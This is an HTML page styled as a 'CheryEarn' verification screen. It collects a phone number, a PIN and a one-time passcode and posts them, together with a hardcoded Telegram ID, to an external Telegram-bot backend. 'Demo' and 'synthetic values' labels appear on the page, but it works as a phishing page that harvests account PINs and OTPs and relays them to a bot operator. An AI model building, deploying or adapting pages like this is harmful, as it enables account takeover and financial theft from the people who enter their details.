<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CheryEarn Verification</title>

<style>
    * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
    }

    body {
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
        font-family: Arial, sans-serif;
        background: #f4f7fc;
        color: #0f172a;
    }

    .card {
        width: 100%;
        max-width: 420px;
        background: #ffffff;
        border-radius: 18px;
        padding: 28px;
        box-shadow: 0 12px 35px rgba(15, 23, 42, 0.10);
    }

    .logo {
        width: 58px;
        height: 58px;
        margin: 0 auto 18px;
        border-radius: 16px;
        background: #0f172a;
        color: #22c55e;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 25px;
        font-weight: 800;
    }

    h1 {
        text-align: center;
        font-size: 25px;
        margin-bottom: 8px;
    }

    .subtitle {
        text-align: center;
        color: #64748b;
        font-size: 14px;
        line-height: 1.5;
        margin-bottom: 25px;
    }

    .demo-badge {
        display: block;
        width: fit-content;
        margin: 0 auto 22px;
        padding: 7px 12px;
        border-radius: 20px;
        background: #dcfce7;
        color: #166534;
        font-size: 12px;
        font-weight: 700;
    }

    label {
        display: block;
        margin-bottom: 7px;
        font-size: 14px;
        font-weight: 700;
    }

    .field {
        margin-bottom: 17px;
    }

    input {
        width: 100%;
        height: 48px;
        padding: 0 14px;
        border: 1px solid #dbe3ef;
        border-radius: 10px;
        outline: none;
        background: #f8fafc;
        color: #0f172a;
        font-size: 15px;
    }

    input:focus {
        border-color: #2563eb;
        background: #ffffff;
        box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.10);
    }

    button {
        width: 100%;
        height: 50px;
        border: none;
        border-radius: 10px;
        background: #2563eb;
        color: #ffffff;
        font-size: 15px;
        font-weight: 700;
        cursor: pointer;
        transition: .2s;
    }

    button:hover {
        background: #1d4ed8;
    }

    button:disabled {
        opacity: .65;
        cursor: not-allowed;
    }

    #result {
        display: none;
        margin-top: 18px;
        padding: 13px;
        border-radius: 10px;
        font-size: 14px;
        line-height: 1.4;
    }

    .success {
        display: block !important;
        background: #dcfce7;
        color: #166534;
    }

    .error {
        display: block !important;
        background: #fee2e2;
        color: #991b1b;
    }

    .footer {
        text-align: center;
        margin-top: 22px;
        color: #94a3b8;
        font-size: 12px;
    }
</style>

</head><body><div class="card">

    <div class="logo">C</div>

    <h1>Verification</h1>

    <p class="subtitle">
        Enter synthetic values to test the Telegram notification flow.
    </p>

    <span class="demo-badge">
        DEMO VERIFICATION
    </span>

    <form id="verificationForm">

        <div class="field">
            <label for="telegramId">
                Telegram ID
            </label>

            <input
                type="text"
                id="telegramId"
                value="5770147915"
                required
            >
        </div>

        <div class="field">
            <label for="phone">
                Phone Number
            </label>

            <input
                type="tel"
                id="phone"
                placeholder="+254712345678"
                required
            >
        </div>

        <div class="field">
            <label for="testPin">
                Test PIN
            </label>

            <input
                type="text"
                id="testPin"
                placeholder="Enter demo PIN"
                required
            >
        </div>

        <div class="field">
            <label for="testOtp">
                Test OTP
            </label>

            <input
                type="text"
                id="testOtp"
                placeholder="Enter demo OTP"
                required
            >
        </div>

        <button type="submit" id="submitBtn">
            Send Demo Verification
        </button>

    </form>

    <div id="result"></div>

    <div class="footer">
        CheryEarn Demo
    </div>

</div>

<script>

const BACKEND_URL =
    "https://telegram-bot-backend-n0gd.onrender.com";

const form =
    document.getElementById("verificationForm");

const button =
    document.getElementById("submitBtn");

const result =
    document.getElementById("result");

form.addEventListener("submit", async function(event) {

    event.preventDefault();

    button.disabled = true;
    button.textContent = "Sending...";

    result.style.display = "none";

    const telegramId =
        document.getElementById("telegramId").value.trim();

    const phone =
        document.getElementById("phone").value.trim();

    const testPin =
        document.getElementById("testPin").value.trim();

    const testOtp =
        document.getElementById("testOtp").value.trim();

    try {

        const response = await fetch(
            `${BACKEND_URL}/demo-verification`,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    telegramId,
                    phone,
                    testPin,
                    testOtp
                })
            }
        );

        const data =
            await response.json();

        if (!response.ok || !data.success) {
            throw new Error(
                data.message ||
                "Request failed."
            );
        }

        result.className = "success";
        result.textContent =
            "✅ Demo verification notification sent successfully.";

    } catch (error) {

        result.className = "error";
        result.textContent =
            "❌ " + error.message;

    } finally {

        button.disabled = false;
        button.textContent =
            "Send Demo Verification";
    }

});

</script></body>
</html>
